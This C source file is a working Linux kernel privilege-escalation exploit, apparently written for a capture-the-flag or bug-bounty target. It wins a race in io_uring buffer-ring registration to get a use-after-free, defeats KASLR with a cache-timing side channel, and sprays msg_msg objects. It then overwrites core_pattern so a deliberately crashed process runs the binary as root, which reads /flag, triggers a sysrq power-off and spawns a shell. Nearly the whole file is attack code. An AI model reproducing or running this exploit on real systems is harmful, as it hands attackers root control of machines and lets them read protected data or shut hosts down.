#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <stdint.h>
#include <signal.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/file.h>
#include <sys/msg.h>
#include <sys/epoll.h>
#include <sys/timerfd.h>
#include <sys/resource.h>
#include <sys/sendfile.h>
#include <linux/io_uring.h>
typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define IORING_SETUP_REGISTERED_FD_ONLY   (1U << 15)
#define IORING_REGISTER_USE_REGISTERED_RING   (1U << 31)
#define IORING_SETUP_NO_MMAP (1U << 14)
#define REQ_F_FIXED_FILE 1
#define IOU_PBUF_RING_MMAP 1
#define IORING_OFF_PBUF_RING 0x80000000ULL
#define IORING_OFF_PBUF_SHIFT 16
#define IORING_SETUP_NO_SQARRAY (1U << 16)
#define SPRAY_COUNT 512
#define DRAIN_COUNT 256
#define _MEMBARRIER_CMD_GLOBAL (1 << 0)

#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

unsigned long ktext = 0xffffffff81000000UL;
const char fake_core_pattern[] = "|/proc/%P/fd/666 %P";

struct io_uring {
    unsigned int head;
    unsigned int tail;
};

struct io_rings {
   struct io_uring sq, cq;
    unsigned int sq_ring_mask, cq_ring_mask;
    unsigned int sq_ring_entries, cq_ring_entries;
    unsigned int sq_dropped;
    int sq_flags;
    unsigned int cq_flags;
    unsigned int cq_overflow;
};

static void perror_exit(const char *msg)
{
    perror(msg); exit(1);
}

static int io_uring_setup(unsigned int entries, struct io_uring_params *p)
{
    return syscall(SYS_io_uring_setup, entries, p);
}

static int io_uring_register(int fd, int opcode, void *arg, unsigned int nr_args)
{
    return syscall(SYS_io_uring_register, fd, opcode, arg, nr_args);
}

static int io_uring_enter(unsigned int fd, unsigned int to_submit,
                          unsigned int min_complete, unsigned int flags,
                          sigset_t *sig)
{
    return syscall(SYS_io_uring_enter, fd, to_submit, min_complete, flags, sig);
}

void set_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
    uint64_t a, d;
    asm volatile (
        "mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
    uint64_t a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

inline __attribute__((always_inline)) void prefetch(void *p)
{
    asm volatile (
        "prefetchnta (%0)\n"
        "prefetcht2 (%0)\n"
        : : "r" (p));
}

u64 flushandreload(void *addr)
{
    u64 time = rdtsc_begin();
    prefetch(addr);
    u64 delta = rdtsc_end() - time;
    return delta;
}

#define KTEXT_GUESS_COUNT 8ul
#define KTEXT_OFFSET 0ul
#define KTEXT_START (0xffffffff81000000ull + KTEXT_OFFSET)
#define KTEXT_END   (0xffffffffD0000000ull + KTEXT_OFFSET)
#define KTEXT_STEP   0x0000000001000000ull
u64 bypass_kaslr_ktext()
{
    sched_yield();

    u64 bases[KTEXT_GUESS_COUNT];

again:
    for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
        u64 times[(KTEXT_END - KTEXT_START) / KTEXT_STEP] = {};
        u64 addrs[(KTEXT_END - KTEXT_START) / KTEXT_STEP];

        for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
            times[ti] = ~0;
            addrs[ti] = KTEXT_START + KTEXT_STEP * (u64)ti;
        }

        for (int i = 0; i < 16; i++) {
            for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                u64 t = flushandreload((void*)addrs[ti]);
                if (t < times[ti]) {
                    times[ti] = t;
                }
            }
        }

        u64 minv = ~0;
        u64 mini = -1;
        for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
            if (times[ti] < minv) {
                mini = ti;
                minv = times[ti];
            }
        }

        if (mini < 0) {
            return -1;
        }

        bases[vote] = addrs[mini];
    }

    int max_count = 0;
    u64 most_frequent = bases[0];
    
    for (int i = 0; i < ARRAY_LEN(bases); i++) {
        int count = 0;
        
        for (int j = 0; j < ARRAY_LEN(bases); j++) {
            if (bases[i] == bases[j]) {
                count++;
            }
        }

        if (count > max_count) {
            max_count = count;
            most_frequent = bases[i];
        }
    }

    return most_frequent;
}

void *payload;
int cg_64[SPRAY_COUNT];
int for_drain[DRAIN_COUNT];
int ioring_fd;
int cfd[2];
char buf[0x2000];


#define DEFAULT_TIMEOUT_CPU0 (850  + 150)
#define MAX_TIMEOUT_CPU0     (1700 + 150)
#define SHIFT_TIMEOUT_CPU0   10

#define DEFAULT_TIMEOUT_CPU1 (1000 + 150)
#define MAX_TIMEOUT_CPU1     (2000 + 150)
#define SHIFT_TIMEOUT_CPU1   10
size_t timeout_cpu0 = DEFAULT_TIMEOUT_CPU0;
size_t timeout_cpu1 = DEFAULT_TIMEOUT_CPU1;

void drain()
{
    *(unsigned long *)payload = 1; // mtype = 1
    for (int i = 0; i < DRAIN_COUNT; i++)
        msgsnd(for_drain[i], payload, (0x1000 - 0x30) /* msg_msg */ + 64 - 0x8 /* msg_seg */, 0);
}

void spray()
{
    *(unsigned long *)payload = 1; // mtype = 1
    for (int i = 0; i < SPRAY_COUNT; i++)
        msgsnd(cg_64[i], payload, (0x1000 - 0x30) /* msg_msg */ + 64 - 0x8 /* msg_seg */, 0);
}

int tfd_cpu0;
int tfd_cpu1;
int timefds[0x1000];
int epfds[0x1000];

static void epoll_ctl_add(int epfd, int fd, uint32_t events)
{
   struct epoll_event ev;
   ev.events = events;
   ev.data.fd = fd;
   epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
}

void do_epoll_enqueue(int fd, int f)
{
   int cfd[2];
   
   socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
   for (int k = 0; k < f; k++)
   {
      if (fork() == 0)
      {
        for (int i = 0; i < 0x100; i++)
            timefds[i] = dup(fd);

        for (int i = 0; i < 0xc0; i++)
            epfds[i] = epoll_create(0x1);
        
        for (int i = 0; i < 0xc0; i++)
            for (int j = 0; j < 0x100; j++)
               epoll_ctl_add(epfds[i], timefds[j], 0);
        
        write(cfd[1], buf, 1);
        raise(SIGSTOP);
      }
      read(cfd[0], buf, 1);
   }

   close(cfd[0]);
   close(cfd[1]);
}

pthread_barrier_t barrier;
void *race(void *arg)
{
    void *ptr;

    set_cpu(1);
    while (1) {
        struct itimerspec new = { .it_value.tv_nsec = timeout_cpu1 };
        
        pthread_barrier_wait(&barrier);
        {
            // struct timespec start, end;
            // long long elapsed_ns;
            // clock_gettime(CLOCK_MONOTONIC, &start);

            {
                timerfd_settime(tfd_cpu1, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
                ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ioring_fd, IORING_OFF_PBUF_RING + (0x69 << IORING_OFF_PBUF_SHIFT));
                if (ptr != MAP_FAILED) {
                    munmap(ptr, 0x1000);
                    // printf("A"); // cpu-0 first
                } else {
                    // printf("B"); // cpu-1 first
                }
            }

            // clock_gettime(CLOCK_MONOTONIC, &end);
            // elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000LL + (end.tv_nsec - start.tv_nsec);
            // printf("Function execution time: %lld nanoseconds\n", elapsed_ns);
        }
        pthread_barrier_wait(&barrier);
    }
}

void crash()
{
    int memfd = memfd_create("", 0);
    char buf[0x100] = {};

    sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
    dup2(memfd, 666);
    close(memfd);

    while (1) {
        int corefd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
        read(corefd, buf, sizeof(buf));
        close(corefd);
        if (strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0)
            break;
        sleep(1);
    }
    *(size_t *)0 = 0;
}

int main(int argc, char *argv[])
{
    int ret;
    size_t start_time = time(NULL);

    if (argc > 1) {
        #define _SYS_pidfd_open 434
        #define _SYS_pidfd_getfd 438
        int pid = strtoull(argv[1], 0, 10);
        int pfd = syscall(_SYS_pidfd_open, pid, 0);
        int stdoutfd = syscall(_SYS_pidfd_getfd, pfd, 1, 0);
        dup2(stdoutfd, 1);
        
        system("cat /flag;echo o>/proc/sysrq-trigger");
        execlp("bash", "bash", NULL);
    }

    if (fork() == 0) {
        set_cpu(1);
        setsid();
        crash();
    }

    void *cq, *sq;
    void *dummy;
    void *pbuf;
    struct io_uring_sqe *sqe;
    struct io_rings *r;
    pthread_t pid;
    
    {
        unsigned long tmp;
        ktext = bypass_kaslr_ktext();
        for (int i = 0; i < 16; i++) {
            tmp = bypass_kaslr_ktext();
            if (tmp < ktext) {
                ktext = tmp;
                break;
            }
        }
        printf("ktext: 0x%016lx\n", ktext);
    }

    cq = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    sq = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    dummy = mmap((void *)0x69690000, 0x1000, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANON | MAP_PRIVATE, -1, 0);

    {
        for (int i = 0; i < DRAIN_COUNT; i++) {
            for_drain[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
            if (for_drain[i] < 0)
                perror_exit("[-] msgget");
        }

        for (int i = 0; i < SPRAY_COUNT; i++) {
            cg_64[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
            if (cg_64[i] < 0)
                perror_exit("[-] msgget");
        }

        payload = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANON | MAP_PRIVATE, -1, 0);
        *(unsigned long *)(payload + (0x1000 - 0x30) + 0x8) = ktext + 0x2db6000; // core_pattern[] at 0xffffffff83db65c0
        *(unsigned int  *)(payload + (0x1000 - 0x30) + 0x1c) = 0x41;             // refcount
        *(unsigned char *)(payload + (0x1000 - 0x30) + 0x21) = 1;                // is_mmap
    }

    {
        struct io_uring_params p = {};
        p.flags |= IORING_SETUP_NO_MMAP;
        p.flags |= IORING_SETUP_NO_SQARRAY;
        p.cq_off.resv2 = (unsigned long)cq;
        p.sq_off.resv2 = (unsigned long)sq;
        ioring_fd = io_uring_setup(2, &p);
        if (ioring_fd < 0) perror_exit("[-] io_uring_setup");
    }

    {
        r = cq;
        sqe = sq;

        sqe->opcode = IORING_OP_PROVIDE_BUFFERS;
        sqe->addr = (unsigned long)dummy;
        sqe->len = 1;
        sqe->fd = 1; // nbufs
        sqe->buf_group = 0x69;
        sqe->off = 0;
        sqe++;

        sqe->opcode = IORING_OP_REMOVE_BUFFERS;
        sqe->fd = 1; // nbufs
        sqe->buf_group = 0x69;
        sqe++;

        r->sq.head = 0;
        r->sq.tail = 2;
    }

    tfd_cpu0 = timerfd_create(CLOCK_MONOTONIC, 0);
    do_epoll_enqueue(tfd_cpu0, 1);

    tfd_cpu1 = timerfd_create(CLOCK_MONOTONIC, 0);
    do_epoll_enqueue(tfd_cpu1, 1);

    pthread_barrier_init(&barrier, NULL, 2);
    pthread_create(&pid, NULL, race, NULL);
    
    int try_count = 0;
    
    set_cpu(0);
    while (1)
    {
        if (try_count++ % 500 == 0)
            printf("now: %d\n", try_count);

        timeout_cpu0 += SHIFT_TIMEOUT_CPU0;
        if (timeout_cpu0 >= MAX_TIMEOUT_CPU0) {
            timeout_cpu0 = DEFAULT_TIMEOUT_CPU0;
            
            timeout_cpu1 += SHIFT_TIMEOUT_CPU1;
            if (timeout_cpu1 >= MAX_TIMEOUT_CPU1)
                timeout_cpu1 = DEFAULT_TIMEOUT_CPU1;
        }

        drain();
        {
            ret = io_uring_enter(ioring_fd, 2, 0, 0, NULL);
            if (ret < 0) perror_exit("[-] io_uring_enter");
        }
        
        {
            struct itimerspec new = { .it_value.tv_nsec = timeout_cpu0 };
            
            pthread_barrier_wait(&barrier);
            {
                
                // struct timespec start, end;
                // long long elapsed_ns;
                // clock_gettime(CLOCK_MONOTONIC, &start);
                
                {
                    timerfd_settime(tfd_cpu0, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
                    struct io_uring_buf_reg reg = {};
                    reg.pad |= IOU_PBUF_RING_MMAP;
                    reg.ring_entries = 1;
                    reg.bgid = 0x69;
        
                    ret = io_uring_register(ioring_fd, IORING_REGISTER_PBUF_RING, &reg, 1);
                    if (ret < 0) perror_exit("[-] io_uring_register");
                }

                // clock_gettime(CLOCK_MONOTONIC, &end);
                // elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000LL + (end.tv_nsec - start.tv_nsec);
                // printf("Function execution time: %lld nanoseconds\n", elapsed_ns);
            }
            pthread_barrier_wait(&barrier);
        }
        
        pbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ioring_fd, IORING_OFF_PBUF_RING + (0x69 << IORING_OFF_PBUF_SHIFT));
        if (pbuf == MAP_FAILED)
            break;

        ret = munmap(pbuf, 0x1000);
        if (ret < 0) perror_exit("[-] munmap");

        struct io_uring_buf_reg reg = {};
        reg.bgid = 0x69;
        ret = io_uring_register(ioring_fd, IORING_UNREGISTER_PBUF_RING, &reg, 1);
        if (ret < 0) perror_exit("[-] io_uring_unregister");

        for (int i = 0; i < DRAIN_COUNT; i++) {
            ret = msgrcv(for_drain[i], buf, (0x1000 - 0x30) /* msg_msg */ + 64 - 0x8 /* msg_seg */, 1, 0);
            if (ret < 0) perror_exit("[-] msgrcv for_drain[]");
        }

        r->sq.head += 2;
        r->sq.tail += 2;
    }

    printf("success!\n");
    sleep(6); // wait for kfree_rcu_monitor wakeup (KFREE_DRAIN_JIFFIES == 5)
    spray();
    
    pbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ioring_fd, IORING_OFF_PBUF_RING + (0x69 << IORING_OFF_PBUF_SHIFT));
    strcpy(pbuf + 0x5c0, fake_core_pattern);

    sleep(-1);
    return 0;
}
